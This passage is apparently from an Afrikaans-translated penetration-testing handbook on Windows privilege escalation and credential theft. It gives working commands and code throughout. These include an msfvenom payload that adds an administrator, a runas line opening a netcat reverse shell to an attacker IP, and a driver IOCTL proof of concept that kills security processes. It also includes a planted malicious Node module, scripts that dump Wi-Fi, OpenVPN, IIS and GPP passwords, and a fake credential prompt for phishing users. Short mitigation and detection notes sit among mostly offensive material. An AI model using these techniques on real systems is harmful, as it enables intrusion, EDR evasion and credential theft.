**Jy kan** hierdie kwesbaarheid met metasploit opspoor en uitbuit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig ’n service binary met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat geneem moet word as 'n diens misluk. Hierdie kenmerk kan gekonfigureer word om na 'n binary te verwys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede kan in die [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) gevind word.

## Applications

### Geïnstalleerde Applications

Kontroleer **permissions van die binaries** (miskien kan jy een oorskryf en privileges eskaleer) en van die **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryfreëls

Kontroleer of jy ’n config file kan wysig om ’n spesiale file te lees, of of jy ’n binary kan wysig wat deur ’n Administrator account uitgevoer gaan word (schedtasks).

’n Manier om swak folder/files permissions in die system te vind, is om die volgende te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ laai enige plugin DLL in sy `plugins` subvouers outomaties. As ’n skryfbare portable/kopie installasie teenwoordig is, gee die plaas van ’n kwaadwillige plugin outomatiese code execution binne `notepad++.exe` op elke launch (insluitend vanaf `DllMain` en plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Kyk of jy een of ander registry of binary kan oorskryf wat deur ’n ander user uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Soek vir moontlike **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As 'n driver 'n arbitrêre kernel read/write primitive blootstel (algemeen in swak ontwerpte IOCTL handlers), kan jy escaleer deur 'n SYSTEM token direk uit kernel memory te steel. Sien die stap-vir-stap tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vir race-condition bugs waar die kwesbare call 'n attacker-controlled Object Manager path oopmaak, kan die doelbewuste vertraag van die lookup (met max-length components of diep directory chains) die venster van mikrosekondes tot tiendes van mikrosekondes rek:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne hive vulnerabilities laat jou toe om deterministic layouts te groom, writable HKLM/HKU descendants te abuse, en metadata corruption in kernel paged-pool overflows te omskep sonder 'n custom driver. Leer die volle ketting hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Sommige signed third‑party drivers skep hul device object met 'n sterk SDDL via IoCreateDeviceSecure maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie flag word die secure DACL nie afgedwing wanneer die device deur 'n path met 'n ekstra component oopgemaak word nie, wat enige unprivileged user toelaat om 'n handle te kry deur 'n namespace path soos:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Sodra 'n user die device kan oopmaak, kan privileged IOCTLs wat deur die driver blootgestel word vir LPE en tampering abuse word. Voorbeelde van capabilities wat in die wild waargeneem is:
- Gee full-access handles na arbitrêre processes terug (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Onbeperkte raw disk read/write (offline tampering, boot-time persistence tricks).
- Beëindig arbitrêre processes, insluitend Protected Process/Light (PP/PPL), wat AV/EDR kill vanaf user land via kernel moontlik maak.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Versagtings vir ontwikkelaars
- Stel altyd FILE_DEVICE_SECURE_OPEN wanneer device objects geskep word wat bedoel is om deur 'n DACL beperk te word.
- Valideer caller context vir bevoorregte operations. Voeg PP/PPL checks by voordat process termination of handle returns toegelaat word.
- Beperk IOCTLs (access masks, METHOD_*, input validation) en oorweeg brokered models in plaas van direkte kernel privileges.

Detection-idees vir defenders
- Monitor user-mode opens van verdagte device names (bv., \\ .\\amsdk*) en spesifieke IOCTL sequences wat op abuse dui.
- Dwing Microsoft se vulnerable driver blocklist af (HVCI/WDAC/Smart App Control) en handhaaf jou eie allow/deny lists.


## PATH DLL Hijacking

As jy **write permissions binne 'n folder op PATH** het, kan jy moontlik 'n DLL hijack wat deur 'n process gelaai word en **privileges escalate**.

Kontroleer permissions van alle folders binne PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie check te abuse:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Dit is `n **Windows uncontrolled search path**-variant wat **Node.js**- en **Electron**-applications raak wanneer hulle `n bare import soos `require("foo")` uitvoer en die verwagte module **missing** is.

Node resolve packages deur op die directory tree op te beweeg en `node_modules` folders by elke parent te check. Op Windows kan daardie walk tot by die drive root reik, so `n application wat vanaf `C:\Users\Administrator\project\app.js` launch kan uiteindelik die volgende probeer:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

As `n **low-privileged user** `C:\node_modules` kan create, kan hulle `n malicious `foo.js` (of package folder) plant en wag vir `n **higher-privileged Node/Electron process** om die missing dependency te resolve. Die payload execute in die security context van die victim process, so dit word **LPE** wanneer die target as `n administrator, vanaf `n elevated scheduled task/service wrapper, of vanaf `n auto-started privileged desktop app` run.

Dit is veral common wanneer:

- `n dependency in `optionalDependencies` declared is
- `n third-party library `require("foo")` in `try/catch` wrap en by failure voortgaan
- `n package uit production builds removed is, tydens packaging omitted is, of failed het om te install
- die vulnerable `require()` diep binne die dependency tree woon eerder as in die main application code

### Hunting vulnerable targets

Gebruik **Procmon** om die resolution path te prove:

- Filter by `Process Name` = target executable (`node.exe`, die Electron app EXE, of die wrapper process)
- Filter by `Path` `contains` `node_modules`
- Focus on `NAME NOT FOUND` en die finale successful open onder `C:\node_modules`

Useful code-review patterns in unpacked `.asar` files or application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifiseer die **ontbrekende pakketnaam** uit Procmon of bronkodehersiening.
2. Skep die root lookup-gids as dit nog nie reeds bestaan nie:
```powershell
mkdir C:\node_modules
```
3. Laat val ’n module met die presiese verwagte naam:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Trigger die slagoffer-toepassing. As die toepassing probeer `require("foo")` en die wettige module ontbreek, kan Node `C:\node_modules\foo.js` laai.

Werklike voorbeelde van ontbrekende optional modules wat by hierdie patroon pas, sluit `bluebird` en `utf-8-validate` in, maar die **technique** is die herbruikbare deel: vind enige **missing bare import** wat ’n geprivilegieerde Windows Node/Electron-proses sal resolve.

### Detection and hardening ideas

- Alert wanneer ’n gebruiker `C:\node_modules` skep of nuwe `.js`-lêers/packages daar skryf.
- Hunt vir high-integrity prosesse wat van `C:\node_modules\*` lees.
- Pak alle runtime dependencies in production saam en oudit `optionalDependencies`-gebruik.
- Hersien derdeparty-code vir stil `try { require("...") } catch {}`-patrone.
- Disable optional probes wanneer die library dit ondersteun (byvoorbeeld kan sommige `ws` deployments die legacy `utf-8-validate` probe vermy met `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kyk vir ander bekende rekenaars wat hardcoded is in die hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerk-koppelvlakke & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kontroleer vir **restricted services** van buite af
```bash
netstat -ano #Opened ports?
```
### Routing Table
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Reëls

[**Kyk na hierdie bladsy vir Firewall verwante commands**](../basic-cmd-for-pentesters.md#firewall) **(lys rules, skep rules, skakel af, skakel af...)**

Meer[ commands vir network enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root user kry, kan jy op enige poort luister (die eerste keer wat jy `nc.exe` gebruik om op 'n poort te luister, sal dit via GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om bash maklik as root te begin, kan jy `--default-user root` probeer

Jy kan die `WSL`-lêerstelsel verken in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Van [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault stoor user credentials vir servers, websites en other programs that **Windows** can **log in the users automaticall**y. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.

Windows Vault stoor credentials that Windows can log in the users automaticall, wat beteken dat enige **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Tensy die applications met Credential Manager integreer, dink ek nie dit is moontlik vir them om the credentials for a given resource te use nie. So, if jou application wants to make use of the vault, it should somehow **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

Gebruik die `cmdkey` om die gestoor credentials op the machine te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred`-opsies gebruik om die gestoorde credentials te gebruik. Die volgende voorbeeld roep 'n remote binary via 'n SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik `runas` met 'n verskafde stel geloofsbriewe.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bied ’n metode vir simmetriese enkripsie van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die simmetriese enkripsie van asimmetriese private keys. Hierdie enkripsie gebruik ’n user- of system-secret om aansienlik tot entropy by te dra.

**DPAPI maak dit moontlik om keys te enkripteer deur ’n simmetriese key wat van die user se login secrets afgelei is**. In scenarios wat system-enkripsie behels, gebruik dit die system se domain authentication secrets.

Geënkripteerde user RSA keys, deur DPAPI te gebruik, word in die `%APPDATA%\Microsoft\Protect\{SID}`-lêergids gestoor, waar `{SID}` die user se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) voorstel. **Die DPAPI key, saam met die master key wat die user se private keys in dieselfde lêer beskerm,** bestaan tipies uit 64 bytes ewekansige data. (Dit is belangrik om daarop te let dat toegang tot hierdie lêergids beperk is, wat voorkom dat die inhoud daarvan via die `dir`-opdrag in CMD gelys kan word, hoewel dit wel via PowerShell gelys kan word).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan **mimikatz module** `dpapi::masterkey` gebruik met die toepaslike arguments (`/pvk` of `/rpc`) om dit te dekripteer.

Die **credentials files wat deur die master password beskerm word** is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan **mimikatz module** `dpapi::cred` gebruik met die gepaste `/masterkey` om te dekripteer.\
Jy kan baie **DPAPI** **masterkeys** uit **memory** onttrek met die `sekurlsa::dpapi` module (as jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** word dikwels gebruik vir **scripting** en outomatiseringstake as 'n manier om geënkripteerde credentials gerieflik te stoor. Die credentials word beskerm met **DPAPI**, wat tipies beteken dat hulle net deur dieselfde gebruiker op dieselfde rekenaar waartoe hulle geskep is, dekripteer kan word.

Om 'n PS credentials uit die lêer wat dit bevat te **dekripteer**, kan jy doen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindings

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg` module met die toepaslike `/masterkey` om **enige .rdg-lêers** te **dekripteer**\
Jy kan **baie DPAPI masterkeys** uit geheue onttrek met die Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Mense gebruik dikwels die StickyNotes-app op Windows-werksstasies om **wagwoorde** en ander inligting te stoor, sonder om te besef dat dit ’n databasielêer is. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om na te soek en te ondersoek.

### AppCmd.exe

**Let daarop dat om wagwoorde uit AppCmd.exe te herwin, jy Administrateur moet wees en onder ’n High Integrity-vlak moet werk.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` gids.\
As hierdie lêer bestaan, is dit moontlik dat sekere **credentials** gekonfigureer is en **herwin** kan word.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kyk of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installeerders word **met SYSTEM-voorregte uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Info van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Geloofsbriewe)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys kan in die register-sleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, so jy moet kyk of daar enigiets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing binne daardie pad vind, is dit waarskynlik 'n gestoorde SSH-sleutel. Dit word geënkripteer gestoor maar kan maklik ontsyfer word met behulp van [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties by selflaai begin, voer uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk of hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar ssh keys te skep, hulle by te voeg met `ssh-add` en via ssh aan te meld by 'n masjien. Die registry HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetric key authentication geïdentifiseer nie.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook vir hierdie lêers soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-rugsteunkopieë
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolktoestemmingsbewyse
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek vir ’n lêer genaamd **SiteList.xml**

### Cached GPP Pasword

’n Kenmerk was voorheen beskikbaar wat die ontplooiing van pasgemaakte plaaslike administrateurrekeninge op ’n groep masjiene via Group Policy Preferences (GPP) toegelaat het. Hierdie metode het egter groot sekuriteitsfoute gehad. Eerstens kon die Group Policy Objects (GPOs), gestoor as XML-lêers in SYSVOL, deur enige domain user verkry word. Tweedens kon die passwords binne hierdie GPPs, geënkripteer met AES256 deur ’n publiek gedokumenteerde verstek-sleutel, deur enige authenticated user gedekripteer word. Dit het ’n ernstige risiko ingehou, aangesien dit gebruikers kon toelaat om verhoogde privileges te verkry.

Om hierdie risiko te verminder, is ’n funksie ontwikkel om te soek na plaaslik gecachede GPP-lêers wat ’n "cpassword"-veld bevat wat nie leeg is nie. Sodra so ’n lêer gevind word, dekripteer die funksie die password en gee ’n pasgemaakte PowerShell object terug. Hierdie object sluit besonderhede oor die GPP en die lêer se ligging in, wat help met die identifisering en remediëring van hierdie sekuriteitskwesbaarheid.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ vir hierdie lêers:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die wagwoorde te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-geloofsbriewe
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logboeke
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir credentials

Jy kan altyd **die gebruiker vra om sy credentials in te voer, of selfs die credentials van ’n ander gebruiker** as jy dink hy kan hulle ken (let op dat **om** die kliënt direk vir die **credentials** te **vra** regtig **riskant** is):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêername wat geloofsbriewe bevat**

Bekende lêers wat soms vroeër **wagwoorde** in **duidelike teks** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
